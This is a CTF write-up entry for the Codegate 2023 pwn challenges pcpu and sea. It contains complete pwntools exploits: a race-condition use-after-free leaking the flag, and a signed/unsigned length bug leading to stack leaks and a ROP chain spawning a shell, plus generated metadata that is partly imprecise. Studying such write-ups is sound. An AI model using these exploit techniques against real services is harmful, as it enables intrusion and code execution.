---
title: 'Codegate CTF 2023: pcpu & sea'
contest: Codegate CTF 2023
year: 2023
difficulty: hard
vuln_type: heap_exploit
tags:
- pwn
- register-uaf
- signed-cmp
- AES-CBC
- rop
- libc-2.31
- splice
attack_chain:
- 'pcpu: reg_list sleep(1)竞态UAF + alloc_list(3)复用释放buffer'
- 0x10000 list OOB read_reg_idx泄露其他寄存器
- 'sea: signed/unsigned类型混淆 char last_byte+memcpy扩展长度'
- dec()栈溢出leak canary/libc/pie
- AES-CBC+ROP execve(/bin/sh)
key_payload: prog=[alloc_list(0),alloc_list(1),copy_reg(0,1),write_reg0_idx(0,10),alloc_list(3),dump_regs()]
one_liner: Codegate 2023两道pwn：pcpu寄存器竞态UAF+sea signed混淆AES-CBC
lesson: sleep(1)竞态+register复用可OOB；signed/unsigned混淆可扩大memcpy长度
quality: high
full_path: Codegate_CTF_2023-_pcpu_&_sea.full.md
meta_path: Codegate_CTF_2023-_pcpu_&_sea.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'Codegate CTF 2023: pcpu & sea。Codegate 2023两道pwn：pcpu寄存器竞态UAF+sea signed混淆AES-CBC。关键路径：pcpu: reg_list sleep(1)竞态UAF + alloc_list(3)复用释放buffer → 0x10000 list OOB read_reg_idx泄露其他寄存器 → sea: signed/un...'
category: pwn
subcategory: heap_exploitation
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/121257.html
wp_author: the
reasoning_chain:
- pcpu 函数 0x16F0 里 v17=(reg_list *)*registers → sleep(1) → v17->list[byte]=high_byte → 触发点：典型竞态 UAF
- 假设：sleep 期间其他线程可能 free 掉 v17 指向的 buffer → alloc_list(3) 复用同一块内存 → 写操作会破坏 alloc_list(3) 的内容
- alloc_list(0), alloc_list(1), copy_reg(0,1), write_reg0_idx(0,10) 让 x0 在 copy 后被释放 → sleep 期间被 alloc_list(3) 接管
- 动作：dump_regs() 后用 read_reg_idx(2,3,i) 循环读 OOB 索引 → 观察：泄露 x0 之外的寄存器内容（包括 flag）
- 假设：flag 在 0x10000 list 内部 OOB 索引 0..77 → 动作：read_reg_idx(2,3,0)~(2,3,77) 收集 flag 字节
- sea 函数 (char)last_byte ≤ 16 与 while(last_byte>i) unsigned 比较 → 触发点：signed/unsigned 长度混淆
- 动作：发 last_byte=-128 让 signed 通过检查、unsigned 触发大长度 memcpy → 观察：栈溢出可读 canary/libc/pie
- AES-CBC enc 模式下溢出覆盖栈 → ROP execve(/bin/sh) → 完成
failed_attempts:
- 试图 race 后立刻 read_reg_idx 不等 sleep → 失败：未等 sleep 完成 alloc_list(3) 还未接管 buffer，OOB 无效
- 试图不改 last_byte 直接 memcpy 触发溢出 → 失败：signed 比较 last_byte<=16 直接拦截
key_observations:
- sleep(1) 竞态 + register 索引复用 = OOB read，固定套路能 leak 任意寄存器内容
- signed/unsigned 类型混淆是 CTF PWN 高频考点，(char)-128 既<16 又>> 任意
- AES-CBC enc 函数栈溢出可同时 leak canary+libc+PIE，是 2023 经典 leak 链
- libc 2.31 上 sys_execve gadget 充足，RBP 劫持 + leave ret 直接控制 RSP
prerequisites:
- Pwntools 基本使用（p8/p16/p32/remote/recvuntil）
- glibc 堆基础（chunk/fastbin/tcache/寄存器列表结构）
- AES-CBC 加密模式与字节序控制
- ROP gadget 构造（pop rdi/rsi/rdx/rax + syscall）
- signed/unsigned 比较与 memset/memcpy 边界
---
# Codegate CTF 2023: pcpu & sea

> 原文: https://www.ctfiot.com/121257.html
> ID: 121257


```
struct reg_list {
 uint64_t is_free;
 union {
 uint64_t rand_digit; // used when is_free == 1
 uint8_t list[0x10000]; // used when is_free == 0
 }
};
/* code snippet in function 0x16F0 */
// obtain the register value
v17 = (reg_list *)*registers;
// sleep that is long enough for other threads to terminate
sleep(1u);
// write element at index specified by the third byte to immediate number specified by the forth byte
v17->list[(unsigned __int8)ptr->third_byte] = ptr->high_byte;
from pwn import *

context(log_level='info')

sh = remote("43.202.54.209", 1234)
# sh = process("./app")
# gdb.attach(sh, "c")
# sleep(2)

def send_insts(insts):
 sh.sendlineafter(b"Inst Size >", str(len(insts)).encode())
 for inst in insts:
 sh.sendline(str(u32(inst)).encode())
 for inst in insts:
 sh.recvuntil(b" > ")

alloc_list = lambda reg : p8(2) + p8(reg) + p16(0xffff)
read_reg_idx = lambda dst, src, idx : p8(4) + p8(dst) + p8(src) + p8(idx)
write_reg0_idx = lambda idx, data : p8(3) + p8(0) + p8(idx) + p8(data)
copy_reg = lambda dst, src : p8(1) + p8(dst) + p8(0) + p8(src)
dump_regs = lambda : p32(7)

prog = [alloc_list(0), alloc_list(1), # allocate 2 buffers
 copy_reg(0, 1), # transfer x1 to x0, x0 will be released
 write_reg0_idx(0, 10),
 # if x0 is first fetched, and sleep, and then released, released buffer is rewritten
 alloc_list(3), # now new buffer allocation gives OOB access
 dump_regs(), # ensure alloc is commited before any idx R/W
]

for i in range(0, 78):
 prog.append(read_reg_idx(2, 3, i))
 prog.append(dump_regs())

send_insts(prog)

flag = []
sh.recvuntil(b"X2 : 0x")
for i in range(0, 78):
 sh.recvuntil(b"X2 : 0x")
 flag.append(int(sh.recvuntil(b"\n"), 16))
 if flag[0] != ord('c'):
 exit(1)
 print(len(flag), b"".join(map(lambda x: bytes([x]), flag)))

sh.interactive()

# codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138bb45}
# codegate2023{a77f1e5998a7d38c0e1f77274a344f142a7ff9d167e1419d41d6489fb138b044}
if ( (char)last_byte <= 16 && len ) // signed comparison, so negative byte can pass the check
{
 while ( last_byte > i ) // unsigned comparison
 {
 if ( src[(unsigned int)last_idx - i] != last_byte ) // unsigned subtraction
 return -1;
 ++i;
 }
 memset(dst, 0, len);
 v12 = len - (char)last_byte; // signed subtraction, so a negative byte can increase the length!
 result = 0;
 *new_len = v12;
 qmemcpy(dst, src, v12);
}
from pwn import *
from Crypto.Cipher import AES
from binascii import *
import sys
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
if len(sys.argv) == 1:
 p = process("./sea",env={'LD_PRELOAD':"./libc-2.31.so"})
else:
 p = remote("54.180.128.138", 45510)

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
def cmd(c):
 sla(b"> ",str(c).encode())
def enc(c):
 cmd(1)
 sla(b": ",c.hex())
 ru(b": ")
 return binascii.unhexlify(p.recvuntil(b"\n")[:-1])
def dec(c):
 cmd(2)
 sla(b": ",c.hex())
 ru(b"plaintext: ")
 return binascii.unhexlify(p.recvuntil(b"\n")[:-1])
def data_overflow(data):
 cmd(2)
 p.sendlineafter(b"ciphertext (as a hexstring) : ", binascii.hexlify(data))

leak = dec(enc(b"A" * 0x10 + b'\x80' * 0x80)[:-0x10])
base = u64(leak[18*8:19*8])-(0x7ffff7e12a61-0x00007ffff7d86000)-(0x7ffff7f36cc2-0x00007ffff7dd6000)
canary = u64(leak[32*8:33*8])
pie = u64(leak[31*8:32*8])-(0x555555558820-0x0000555555554000)
info(hex(pie))
info(hex(base))

info(hex(canary))
libc=ELF("./libc-2.31.so")
libc.address = base
rop=ROP(libc)
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
rax = rop.find_gadget(['pop rax','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
leave = 0x00000000000578c8+base

syscall = rop.find_gadget(['syscall','ret'])[0]
binsh = libc.search(b'/bin/sh').__next__()

cmd(2)
sla(b": ", (b'A' * 288 + b'\x00' * (32 + 256 + 256 + 1)).hex())

kw = enc(b"A")
key = kw[0:8] + p32(u32(kw[8:12]) ^ u32(kw[0:4])) + p32(u32(kw[12:16]) ^ u32(kw[4:8]))

data_overflow( b"".ljust(288,b'A')+ b'\x8d\x01\x02\x04\x08\x10 @\x80\x1b6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00R\tj\xd506\xa58\xbf@\xa3\x9e\x81\xf3\xd7\xfb|\xe39\x82\x9b/\xff\x874\x8eCD\xc4\xde\xe9\xcbT{\x942\xa6\xc2#=\xeeL\x95\x0bB\xfa\xc3N\x08.\xa1f(\xd9$\xb2v[\xa2Im\x8b\xd1%r\xf8\xf6d\x86h\x98\x16\xd4\xa4\\\xcc]e\xb6\x92lpHP\xfd\xed\xb9\xda^\x15FW\xa7\x8d\x9d\x84\x90\xd8\xab\x00\x8c\xbc\xd3\n\xf7\xe4X\x05\xb8\xb3E\x06\xd0,\x1e\x8f\xca?\x0f\x02\xc1\xaf\xbd\x03\x01\x13\x8ak:\x91\x11AOg\xdc\xea\x97\xf2\xcf\xce\xf0\xb4\xe6s\x96\xact"\xe7\xad5\x85\xe2\xf97\xe8\x1cu\xdfnG\xf1\x1aq\x1d)\xc5\x89o\xb7b\x0e\xaa\x18\xbe\x1b\xfcV>K\xc6\xd2y \x9a\xdb\xc0\xfex\xcdZ\xf4\x1f\xdd\xa83\x88\x07\xc71\xb1\x12\x10Y\'\x80\xec_`Q\x7f\xa9\x19\xb5J\r-\xe5z\x9f\x93\xc9\x9c\xef\xa0\xe0;M\xae*\xf5\xb0\xc8\xeb\xbb<\x83S\x99a\x17+\x04~\xbaw\xd6&\xe1i\x14cU!\x0c}c|w{\xf2ko\xc50\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc4\xa5\xe5\xf1q\xd81\x15\x04\xc7#\xc3\x18\x96\x05\x9a\x07\x12\x80\xe2\xeb\'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe9JLX\xcf\xd0\xef\xaa\xfbCM3\x85E\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d8\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\x0c\x13\xec_\x97D\x17\xc4\xa7~=d]\x19s`\x81O\xdc"*\x90\x88F\xee\xb8\x14\xde^\x0b\xdb\xe02:\nI\x06$\\\xc2\xd3\xacb\x91\x95\xe4y\xe7\xc87m\x8d\xd5N\xa9lV\xf4\xeaez\xae\x08\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5fH\x03\xf6\x0ea5W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6BhA\x99-\x0f\xb0T\xbb\x16\x01')

c = enc(b"A")
iv = bytes([a^b for a,b in zip(AES.new(key, AES.MODE_ECB).decrypt(c), b"A".ljust(16, b'\x0f'))])
print(binascii.hexlify(key), binascii.hexlify(iv))

aes = AES.new(key, AES.MODE_CBC, iv)
info(hex(leave))
rrr = flat([
 0x555555558020-0x0000555555554000+pie-8,0,leave,0
])
ropchain = flat([
 rdi,binsh,rsi,0,rdx,0,libc.sym['execve']
])
enc(aes.decrypt(AES.new(key, AES.MODE_CBC, iv).encrypt(ropchain.ljust(0xf0,b'\0')) + p64(canary) + cyclic(0x8)+rrr))

p.interactive()
```
